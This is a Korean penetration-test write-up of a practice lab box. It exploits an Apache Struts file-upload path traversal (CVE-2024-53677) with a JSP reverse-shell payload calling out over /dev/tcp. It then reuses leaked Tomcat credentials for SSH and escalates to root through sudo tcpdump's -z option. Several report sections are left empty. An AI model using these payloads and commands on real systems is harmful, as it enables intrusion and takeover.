---
publish: true
title: 모의해킹 보고서 - lab16
created: 2026-11-11
modified: 2026-11-13T01:24:09.023Z
published: 2026-11-11
date: 2026-11-11
tags:
description:
lab: lab16
---

## 목차

1. [개요](#1-개요)
2. [총평](#2-총평)
3. [정보 수집 대상](#3-정보-수집-대상)
4. [진단결과 요약](#4-진단결과-요약)
5. [모의해킹 수행 내용](#5-모의해킹-수행-내용)
6. [취약점](#6-취약점)

## 1. 개요

본 보고서는 2026년 11월 11일에 진행된 lab16에 대한 모의해킹 보고서이다.

## 2. 총평

이번 lab16 모의해킹에서는
이는 외부에서 시작된 침해가 서버 전체에 대한 통제권 확보로 확대될 수 있음을 보여준다.

보완을 위해

## 3. 정보 수집 대상

개인 실습 서버 lab16을 대상으로 취약점을 점검했다. 대상 서버 lab16의 IP는 자산 보호 차원에서 가려두었다.

## 4. 진단결과 요약

아래 표는 이번 모의해킹 과정에서 발견된 주요 취약점을 요약한 것이다. 각 취약점에 대한 자세한 설명 및 대응 방안은 본 보고서의 '취약점' 섹션에서 확인할 수 있다.

| 취약점 이름 | 위험도 | 설명  | 대응방안 |
| :----: | :-: | :-: | :--: |
|        |     |     |      |
|        |     |     |      |

## 5. 모의해킹 수행 내용 

![[00. Setting/00. 첨부파일/Pasted image 20261110170530.png]]

대상 서버를 포트 스캔 해보면 `SSH`와 `HTTP` 가 열려있다.
`http://strutted.htb`이란 호스트명이 있다.

![[00. Setting/00. 첨부파일/Pasted image 20261110170739.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261110170716.png]]

`/etc/hosts`에서 IP에 호스트명을 달아준다.

![[00. Setting/00. 첨부파일/Pasted image 20261110170559.png]]

웹페이지가 제대로 뜬다.

![[00. Setting/00. 첨부파일/Pasted image 20261110170849.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261110170914.png]]

오른쪽 상단 `Download`를 눌러보면 `strutted.zip`이라는 파일이 다운된다.

![[00. Setting/00. 첨부파일/Pasted image 20261111152436.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261111152404.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261111152548.png]]

`strutted.zip`를 `unzip`으로 풀어주면 `tomcat-user.xml`이 나온다. 관리자의 비밀번호가 있다.

![[00. Setting/00. 첨부파일/Pasted image 20261111152640.png]]

`pom.xml` 파일을 확인한다.

\*`pom.xml`: maven 프로젝트의 설정 파일. 프레임워크의 버전 등을 확인.

![[00. Setting/00. 첨부파일/Pasted image 20261111152720.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261111152937.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261111153014.png]]

Apache struts를 쓰고 버전이 6.3.0.1이라는 걸 알 수 있다.

\*`Apache struts`: Java로 웹 애플리케이션을 만들 때 사용하는 MVC 프레임워크. 웹 요청을 받아 어떤 코드가 처리할지 연결하고, 결과를 JSP 같은 화면으로 보여주는 일을 돕는다.

\*`MVC 프레임워크`: MVC는 코드를 역할 별로 나누는 방식, 프레임워크는 앱을 만들 때 사용하는 도구.
\=> Apache struts는 MVC 방식으로 웹앱을 만들도록 돕는 프레임워크.

| 역할             | 하는 일               |
| -------------- | ------------------ |
| **Controller** | 요청을 받고 처리, 연결      |
| **Model**      | 요청에 대한 정보를 확인하고 저장 |
| **View**       | 결과 화면을 보여줌         |

\~~CMV가 아니라 굳이 MVC란다~~

\*`JSP`: JavaServer Pages. HTML 안에 java 코드를 넣어서 서버에서 실행할 수 있는 웹페이지 형식.

![[00. Setting/00. 첨부파일/Pasted image 20261111153133.png]]

파일 업로드와 관련된 공개된 취약점이 있다. `CVE-2024-53677`. 업로드하는 파일을 가로채서 조작한다 (FileUploadInterceptor).

동작하는 방식은

1. `name="Upload"` 에 업로드할 파일 데이터가 들어간다.
2. 파일과 연결된 이름 정보가 `UploadFileName`이라는 속성으로 다뤄진다.
3. `name="top.UploadFileName"`은 Struts의 값 스택에서 맨 위 객체(`top`)의 그 속성에 값을 넣으려는 요청이다. 이 값으로 파일명을 경로처럼 해석해 원래 업로드 폴더 밖으로 저장 경로가 벗어난다.

이 취약점을 어떻게 공격할 수 있을까.

![[00. Setting/00. 첨부파일/Pasted image 20261111170115.png]]

Strutted의 Dockerfile을 열어보면 Strutted 앱을 어떻게 배포하는 지에 대한 내용이 나와있다.

```
ROOT.war로 webapps로 배포 -> 경로가 /usr/local/tomcat/webapps/ROOT.war 가 된다.
```

여기서 알 수 있는 내용은,

1. `Tomcat`은 `WAR`의 파일 이름을 웹앱의 URL 경로로 쓴다. => `Tomcat`이 `ROOT.war`를 웹앱의 기본 경로인 `/` 에 배포한다(.war의 이름 따라감). =>**http://strutted.htb/ 경로에서 `Strutted`가 열린다.**

2. `Apache Sturts`와 `tomcat`을 쓰고 있으니 **`JSP` 파일 처리가 가능하다.**

![[00. Setting/00. 첨부파일/Pasted image 20261111170712.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261111170741.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112015707.png]]

`Upload.java`에서 업로드에 대한 코드를 확인해보면 일반 파일은 `/webapps/ROOT/uploads/<날짜_시간>/<파일이름>`으로 들어간다.

![[00. Setting/00. 첨부파일/Pasted image 20261112021230.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112032818.png]]

`web.xml` 파일에서 '일반 파일로 uploads에 올라간 파일은 정적 파일(staticServlet), 읽기 전용(readonly true)으로 취급되어 스크립트가 실행되지 않음'을 알 수 있다.

그러므로,

1. 정적 파일 업로드 경로를 벗어난 경로에 업로드를 해야 파일이 아닌 코드로 실행이 된다.
   \=> `JSP`는 `Tomcat`이 처리하고, `Tomcat`은 `ROOT.war`를 풀어 배포를 하니 `JSP` 쉘 코드는 `/`에서 실행된다. => `JSP`코드를 넣을 경로는 `http://strutted.htb/<파일_이름>.jsp`가 된다.

2. `ROOT.war`가 들어가는 경로로 가야 하니 정적 파일 업로드 되는 자리에서 두 번 올라간 경로에 들어가야 한다.  `/webapps/ROOT/uploads/<날짜_시간>/<파일이름>` ->  **`../../<파일_이름>.jsp`**

![[00. Setting/00. 첨부파일/Pasted image 20261112015832.png]]

`web.xml`에 업로드 파일을 어떻게 감별하는지도 적혀있다. -> **각 파일 확장자가 가지는 매직 바이트를 검사한다.**

\=> 이미지 파일을 업로드하고 `../../`로 경로 조작, 이미지 확장자에 대한 매직바이트만 남기고 뒤에는 JSP 리버스쉘 코드를 붙여 페이로드 조작, 실행한다.

![[00. Setting/00. 첨부파일/Pasted image 20261111153235.png]]

이미지 파일을 올려주고

![[00. Setting/00. 첨부파일/Pasted image 20261111153720.png]]

```
name="Upload"
```

```
GIF89a
<%
Runtime r = Runtime.getRuntime(); String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/[MASK]/443 0>&1"}; Process p = r.exec(cmd);
%>
```

```
Content-Disposition: form-data; name="uploadFileName"

../../web.jsp
```

페이로드로 `GIF` 매직넘버를 붙인 `JSP` 리버스쉘을 넣어주고 경로를 조작 후

_(name="Upload" 만 제대로 넣어주면 Disposition의 name은 uploadFileName이든 top.UploadFileName이든 UploadFileName이든 상관이 없는 듯 하다)_

![[00. Setting/00. 첨부파일/Pasted image 20261112044145.png]]

업로드 된 경로로 들어가면

![[00. Setting/00. 첨부파일/Pasted image 20261111155754.png]]

열려있던 포트로 연결이 된다.

![[00. Setting/00. 첨부파일/Pasted image 20261111155955.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261111160023.png]]

셸 안정화를 해준다. `whoami`로 사용자를 확인한다(tomcat).

![[00. Setting/00. 첨부파일/Pasted image 20261112035223.png]]

`tomcat`에는 `root`의 권한으로 실행할 수 있는 것이 없다.
다른 사용자를 찾아보자.

![[00. Setting/00. 첨부파일/Pasted image 20261112035359.png]]

다른 사용자로 `james`가 있다. 하지만 권한이 없어 `james`의 폴더를 볼 수 없다.
사용자 정보를 어떻게 얻을 수 있을까.

![[00. Setting/00. 첨부파일/Pasted image 20261112035541.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112035702.png]]

포트 스캔했을 때 `SSH`가 열려있었다. 맨 처음 `tomcat-user.xml`에서 봤던 관리자 비밀번호로 접근해봤지만, 맞지 않는다.

그렇다면 대상 서버에 갱신된 최근 버전의 파일이 있지 않을까?

![[00. Setting/00. 첨부파일/Pasted image 20261111160859.png]]

대상 서버에서 `tomcat-users.xml`을 찾아본다.

![[00. Setting/00. 첨부파일/Pasted image 20261112040240.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112040322.png]]

비밀번호가 있는 파일을 찾았다.

![[00. Setting/00. 첨부파일/Pasted image 20261112040036.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261112040119.png]]

다운로드한 파일보다 대상 서버에 있는 파일이 더 최근에 생성됐다.
새로 찾은 비밀번호로 다시 시도해보자.

![[00. Setting/00. 첨부파일/Pasted image 20261111160649.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261111161054.png]]

`james`로 접속 성공했다.

![[00. Setting/00. 첨부파일/Pasted image 20261111155335.png]]

패스워드 없이 `root` 권한으로 실행할 수 있는 실행 명령이 있다.
`/usr/sbin/tcpdump`

\*`tcpdump`: 네트워크를 오가는 패킷을 캡처하고 분석하는 명령줄 도구.

![[00. Setting/00. 첨부파일/Pasted image 20261111154801.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261111154820.png]]

먼저 `root`로 실행될 shell을 만들어준다.

**새 파일로 복사하면 보통 복사를 실행한 사용자가 소유자가 되므로** `root`가 `tcpdump`를 실행하면서 `bash`를 복사해 만든 `rootbash`의 소유자는 `root`가 된다.
`rootbash`에는 4755(그룹과 다른 사용자는 수정을 못 하도록) 권한을 준다.

![[00. Setting/00. 첨부파일/Pasted image 20261111154845.png]]

만든 shell 파일엔 실행 권한을 추가한다.

![[00. Setting/00. 첨부파일/Pasted image 20261111154953.png]]

```
sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/privesc.sh -Z root
```

- `sudo`: 명령을 root 권한으로 실행
- `-i eth0`: `eth0` 네트워크 인터페이스를 캡처
- `-n`: IP 주소 등을 도메인 이름으로 바꾸지 않음
- `-l`: 출력 버퍼링 방식을 바꿈
- `-w /dev/null`: 캡처 데이터를 `/dev/null`로 보냄
- `-G 1`: 1초마다 캡처 파일을 교체
- `-W 1`: 캡처 파일을 1개만 만들고 종료
- `-z /tmp/privesc.sh`: 파일이 닫힐 때 이 스크립트를 실행
- `-Z root`: tcpdump가 root 권한을 다른 사용자 권한으로 낮추지 않도록 함

\=> **`root` 권한으로 `tcpdump`를 실행해 패킷을 잠깐 캡처하고, 캡처 파일이 닫힐 때 지정한 스크립트를 실행하라는 뜻.**

![[00. Setting/00. 첨부파일/Pasted image 20261111155042.png]]

`rootbash`가 `root`의 소유로 생성됐다.

![[00. Setting/00. 첨부파일/Pasted image 20261111154532.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261111154509.png]]

`rootbash`를 옵션 `-p`(얻은 권한을 bash가 낮추지 않게 함)를 붙여서 실행해주면,
`root`로 권한 상승에 성공했다.

## 6. 취약점

```
CVSS v4.0 점수: 10 / Critical
Macro vector: 000100
Exploitability: High
Complexity: High
Vulnerable system: High
Subsequent system: Medium
Exploitation: High
Security requirements: High
```

### 6.1  

<br> **6.1.1 설명**

-

<br> **6.1.2 조치방법**

-
